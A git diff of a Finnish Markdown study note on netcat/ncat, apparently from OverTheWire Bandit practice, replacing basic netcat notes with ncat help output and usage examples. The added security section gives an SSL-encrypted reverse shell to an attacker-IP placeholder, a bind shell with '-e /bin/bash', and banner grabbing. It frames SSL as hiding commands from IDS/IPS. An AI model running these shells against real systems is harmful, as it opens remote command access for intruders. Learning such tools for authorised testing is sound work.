@@ -1,132 +1,155 @@
-# netcat 
+# ncat - netcat
 
-`nc` - netcat komento on työkalu, joka: 
+Ncat (netcat) on monipuolinen ja nykyaikainen komentorivityökalu verkkodatansiirtoon, jota käytetään tiedon lukemiseen, kirjoittamiseen ja uudelleenohjaamiseen verkoissa (TCP/UDP/SCTP/SSL). Nmap-projektin kehittämä työkalu toimii sekä asiakkaana että palvelimena, ja se on tehokas apuväline verkon diagnosointiin, porttiskannaukseen, tiedostonsiirtoon ja etähallintaan (remote shell). Sillä onkin kätevä testata vaikkapa palomuurin tai pakettisuodattimen toimintaa.
 
-- avaa yhteyden (TCP tai UDP) - kertauksena TCP/UDP portteja on 0-65 535
-  - kaikki portit ei ole auki, mutta jettu kolmeen ryhmään
-  - 0–1023 (System/Well-known ports): Varattu tutuille peruspalveluille (esim. HTTP on 80, HTTPS on 443 ja SSH on 22).
-  - 1024–49151 (Registered ports): Yritysten ja sovellusten rekisteröimiä portteja (esim. monet pelit tai tietokannat).
-  - 49152–65535 (Dynamic/Private ports): Käytetään yleensä tilapäisinä portteina, kun tietokoneesi ottaa yhteyden palvelimeen.
-  - Tietoturvan vuoksi on tapana pitää mahdollisimman monet portit suljettuina palomuurilla, jotta kutsumattomat vieraat eivät pääse koneelle.
-- lukee stdinistä
-- lähettää datan
-- tulostaa vastauksen
 
-Se ei “rajoita” portteja tai yhteyksiä — rajat tulevat:
-- käyttöjärjestelmästä
-- verkosta (firewall)
-- palvelusta johon yhdistät
-- toimii suoraan verkon kanssa
-- yhdistyy mihin tahansa TCP/UDP-palveluun
-
-Milloin kannattaa käyttää?
-
-Käytä nc:tä kun:
-- haluat testata nopeasti porttia
-- debuggaat verkko-ongelmaa
-- haluat nähdä “raakadatan”
-- et halua raskaita työkaluja
-
-nc komento käyttö malli:
 ```
-nc --help
-nc: invalid option -- '-'
-usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
-          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
-          [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]
-          [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
-          [destination] [port]
-```
+bandit15@bandit:~$ ncat --help
+Ncat 7.94SVN ( https://nmap.org/ncat )
+Usage: ncat [options] [hostname] [port]
 
-perusmuoto
-```
-$nc [optioita] <host> <portti>
-```
+Options taking a time assume seconds. Append 'ms' for milliseconds,
+'s' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).
+  -4                         Use IPv4 only
+  -6                         Use IPv6 only
+  -U, --unixsock             Use Unix domain sockets only
+      --vsock                Use vsock sockets only
+  -C, --crlf                 Use CRLF for EOL sequence
+  -c, --sh-exec <command>    Executes the given command via /bin/sh
+  -e, --exec <command>       Executes the given command
+      --lua-exec <filename>  Executes the given Lua script
+  -g hop1[,hop2,...]         Loose source routing hop points (8 max)
+  -G <n>                     Loose source routing hop pointer (4, 8, 12, ...)
+  -m, --max-conns <n>        Maximum <n> simultaneous connections
+  -h, --help                 Display this help screen
+  -d, --delay <time>         Wait between read/writes
+  -o, --output <filename>    Dump session data to a file
+  -x, --hex-dump <filename>  Dump session data as hex to a file
+  -i, --idle-timeout <time>  Idle read/write timeout
+  -p, --source-port port     Specify source port to use
+  -s, --source addr          Specify source address to use (doesn't affect -l)
+  -l, --listen               Bind and listen for incoming connections
+  -k, --keep-open            Accept multiple connections in listen mode
+  -n, --nodns                Do not resolve hostnames via DNS
+  -t, --telnet               Answer Telnet negotiations
+  -u, --udp                  Use UDP instead of default TCP
+      --sctp                 Use SCTP instead of default TCP
+  -v, --verbose              Set verbosity level (can be used several times)
+  -w, --wait <time>          Connect timeout
+  -z                         Zero-I/O mode, report connection status only
+      --append-output        Append rather than clobber specified output files
+      --send-only            Only send data, ignoring received; quit on EOF
+      --recv-only            Only receive data, never send anything
+      --no-shutdown          Continue half-duplex when receiving EOF on stdin
+      --allow                Allow only given hosts to connect to Ncat
+      --allowfile            A file of hosts allowed to connect to Ncat
+      --deny                 Deny given hosts from connecting to Ncat
+      --denyfile             A file of hosts denied from connecting to Ncat
+      --broker               Enable Ncat's connection brokering mode
+      --chat                 Start a simple Ncat chat server
+      --proxy <addr[:port]>  Specify address of host to proxy through
+      --proxy-type <type>    Specify proxy type ("http", "socks4", "socks5")
+      --proxy-auth <auth>    Authenticate with HTTP or SOCKS proxy server
+      --proxy-dns <type>     Specify where to resolve proxy destination
+      --ssl                  Connect or listen with SSL
+      --ssl-cert             Specify SSL certificate file (PEM) for listening
+      --ssl-key              Specify SSL private key (PEM) for listening
+      --ssl-verify           Verify trust and domain name of certificates
+      --ssl-trustfile        PEM file containing trusted SSL certificates
+      --ssl-ciphers          Cipherlist containing SSL ciphers to use
+      --ssl-servername       Request distinct server name (SNI)
+      --ssl-alpn             ALPN protocol list to use
+      --version              Display Ncat's version information and exit
 
-pipe-mallit:
-```
-echo "hello" | nc localhost 30000
-
-cat tiedosto.txt | nc localhost 30000
-```
-
-TCP vs UPD tarkistus
-TCP oletus:
-```
-nc localhost 30000
-```
-
-UDP:
-```
-nc -u localhost 30000
-```
-
-Tiedoston siirto (klassinen esimerkki)
-
-vastaanottaja:
-```
-nc -l 1234 > vastaanotettu.txt
+See the ncat(1) manpage for full options, descriptions and usage examples
 ```
 
-lähettäjä:
+Muutamia esimerkkiä komentoja ja syntaksia asiakasohjelma (client) ja malli:
 ```
-cat tiedosto.txt | nc <ip> 1234
-```
-
-Timeout (hyödyllinen usein)
-esim. odottaa 3 sekunttia ja sulkee yhteyden
-```
-nc -w 3 localhost 30000
+ncat [OPTIONS] <kohde/IP> <portti>
+$ ncat --ssl 192.168.1.1 443
 ```
 
-Portien tarkistus (esim. onko pystyssä ja portti auki ja vastaako joku siellä)
-```
-nc -zv localhost 30000
-```
+Ennen sitä putki edessä  `|` - tämä tarkoittaa lähettää esim. tekstin "abcd" suojatun SSL-yhteyden yli paikallisen koneen porttiin 30001. Tämä on hyvin yleinen tapa testata, ottaako palvelin dataa vastaan.
 
-Yhteyksien debuggaus (erittäin käytännöllinen), esim. tarkista palveluiden "raaka", mikäli vastaa se saattaa antaa
- - GET / HTTP/1.1
- - Host: example.com
 ```
-nc example.com 80
+$echo "abcd" | ncat --ssl localhost 30001
 ```
 
-Port forwarding (yksinkertainen viritys) - toimii kuin tason "välittäjänä"
-```
-nc -l 1234 | nc target.com 80
-```
+## Muita hyödyllisiä komentoja ja käyttötapauksia
 
-## komennon tietoturva, kyber ja käyttötarkoitus
+1. PERUSSYNTAKSI (CLIENT)
+Komento: `$ncat [valitsimet] <kohde/IP> <portti>`
+Esimerkki: `$ncat --ssl 192.168.1.1 443`
+Käyttö: Muodostaa suojatun yhteyden palvelimeen.
 
-Netcat (`nc`) on monikäyttöinen työkalu, jota voidaan käyttää täysin normaalisti esimerkiksi omien tai luvallisten järjestelmien porttien ja palveluiden testaamiseen. Sillä voidaan tarkistaa, onko esimerkiksi portit 80 (HTTP) tai 443 (HTTPS) auki ja mitä palveluita niiden takana toimii. Vastaava toiminnallisuus löytyy myös Windows PowerShell-ympäristössä komennolla `Test-NetConnection`.
+2. SSL-SALATTU CHAT-PALVELIN
+Palvelin: `$ncat -l --ssl --chat 4444`
+Asiakas: `$ncat --ssl <palvelimen_ip> 4444`
+Käyttö: Luo täysin salatun pikaviestiyhteyden kahden koneen välille. --chat lisää viesteihin käyttäjä-ID:t.
 
-Tietoturvan ja eettisen hakkeroinnin näkökulmasta ratkaisevaa on aina lupa ja tarkoitus. Sallittua on testata omia järjestelmiä tai kohteita, joihin on annettu lupa, kuten bug bounty -ohjelmissa. Sen sijaan satunnainen porttien skannaus tai palveluiden testaaminen ilman lupaa on kiellettyä ja voi olla laitonta, vaikka kyse olisi pelkästä uteliaisuudesta.
+3. SUOJATTU TIEDOSTONSIIRTO
+Vastaanottaja: `$ncat -l --ssl 5555 > vastaanotettu_tiedosto.zip`
+Lähettäjä: `$ncat --ssl <vastaanottajan_ip> 5555 < tiedosto_lähetettävä.zip`
+Käyttö: Turvallinen tapa siirtää tiedostoja ilman erillisiä palvelinohjelmistoja.
 
-nc toimii ns. low-level työkaluna:
--  ei piilota mitään
-- ei automatisoi liikaa
-- näyttää miten verkko oikeasti toimii
+4. HTTP-VÄLITYSPALVELIN (PROXY)
+Komento: `$ncat -l 3128 --proxy-type http`
+Käyttö: Luo paikallisen HTTP-proxyn, jonka kautta voit reitittää muuta verkkoliikennettä.
 
-Siksi sitä käytetään:
-- auditoinneissa
-- penetraatiotestauksessa
-- debuggaamisessa
+5. PORTTIEN JA YHTEYDEN TARKISTUS (SCANNING)
+Komento: `$ncat -zv <kohde_ip> 20-100`
+Käyttö: Tarkistaa nopeasti, mitkä portit välillä 20-100 ovat auki.
+-z: Zero-I/O (yhteys ilman dataa)
+-v: Verbose (yksityiskohtainen palaute)
 
-
-Eettisessä hakkeroinnissa:
-
-✔ sallittua:
-- testata omia järjestelmiä
-- testata järjestelmiä joihin on lupa
-- bug bounty -ohjelmat
-
-❌ ei sallittua:
-- satunnainen porttiskannaus netissä
-- palveluihin yhdistely ilman lupaa
-- “kokeilu uteliaisuudesta” toisten järjestelmiin
+6. SSL-SERTIFIKAATIN VARMENTAMINEN
+Komento: `$ncat --ssl-verify <kohde> 443`
+Käyttö: Varmistaa, että kohteen SSL-sertifikaatti on luotettu ja voimassa. Estää yhteyden, jos sertifikaatti on epäilyttävä.
 
 
-nc on täysin normaali työkalu
-- käytetään sekä ylläpidossa että hakkeroinnissa
-- porttien tarkistus (80, 443 jne.) on perusjuttu
-- ratkaisevaa on lupa ja tarkoitus
+LISÄVALITSIMET (ADVANCED)
+
+- -k (Keep-open): Pitää palvelimen päällä, vaikka asiakas poistuu.
+- -i (Idle-timeout): Katkaisee yhteyden automaattisesti toimettomuuden jälkeen (esim. 30s).
+- -x (Hex-dump): Tallentaa kaiken liikenteen heksamuodossa analysointia varten.
+- -n (No-DNS): Estää DNS-haut, nopeuttaa ja pysyy hiljaisempana.
+- -C (CRLF): Käyttää verkkoprotokollien vaatimaa rivinvaihtoa.
+- -u (UDP): Käyttää UDP-protokollaa TCP:n sijaan.
+
+## NCAT - TIETOTURVA JA EETINEN HAKKEROINTI
+
+Ncat on eettisessä hakkeroinnissa ja tietoturvatestauksessa yksi tärkeimmistä työkaluista juuri sen takia, että se on usein esiasennettuna tai helposti saatavilla (osana Nmapia).
+
+1. REVERSE SHELL (SSL-SUOJATTU)
+Tämä on klassinen tapa saada yhteys kohteesta hyökkääjän koneelle. SSL estää palomuureja (IDS/IPS) näkemästä komentoja selväkielisenä.
+Hyökkääjän kuuntelija: `$ncat -l --ssl -p 4444`
+Uhri (kohde): `$ncat --ssl <hyökkääjän_ip> 4444 -e /bin/bash`
+(Windowsissa: -e cmd.exe)
+Käyttö: Kohde yhdistää takaisin hyökkääjään ja antaa pääsyn komentoriville.
+
+2. BIND SHELL (SSL-SUOJATTU)
+Tässä kohde avaa portin ja jää odottamaan, että hyökkääjä yhdistää siihen.
+Uhri (kohde): `$ncat -l --ssl -p 4444 -e /bin/bash`
+Hyökkääjä: `$ncat --ssl <uhrin_ip> 4444`
+Käyttö: Käytetään, jos kohteessa ei ole palomuuria estämässä sisäänpäin tulevaa liikennettä.
+
+3. BANNER GRABBING (TIEDONKERUU)
+Ncatilla voidaan selvittää, mikä palvelu ja versio portissa pyörii.
+Komento: `$echo "" | ncat -v -n -w 1 <kohde_ip> <portti>`
+Käyttö: Palvelin vastaa usein kertomalla nimensä ja versionsa (esim. "Apache/2.4.41"), mikä auttaa haavoittuvuuksien etsinnässä.
+
+4. PÄÄSYLISTAT (ACCESS CONTROL)
+Voit rajoittaa, kuka saa yhdistää kuuntelevaan Ncatiin.
+Komento: `$ncat -l --ssl -p 8080 --allow 192.168.1.10`
+Käyttö: Sallii yhteydet vain tietystä IP-osoitteesta. --deny kieltää tietyn osoitteen. Hyödyllinen oman hyökkäysinfrastruktuurin suojaamiseen.
+
+5. PORTTIEN UUDELLEENOHJAUS (PORT RELAY)
+Ncat toimii siltana kahden eri verkon tai koneen välillä.
+Komento: `$ncat -l 8080 -c "ncat <kohde_ip> 80"`
+Käyttö: Kun joku yhdistää koneesi porttiin 8080, Ncat ohjaa liikenteen automaattisesti eteenpäin kohde-IP:n porttiin 80.
+
+6. HTTP-VASTAUKSEN SIMULOINTI
+Voit testata, miten sovellus käyttäytyy, kun se saa tietyn vastauksen palvelimelta.
+Komento: `$ncat -l 80 < vastaus_tiedosto.txt`
+Käyttö: Kun selain tai työkalu yhdistää porttiin 80, Ncat syöttää sille tiedoston sisällön (esim. muokatun HTTP-headerin).
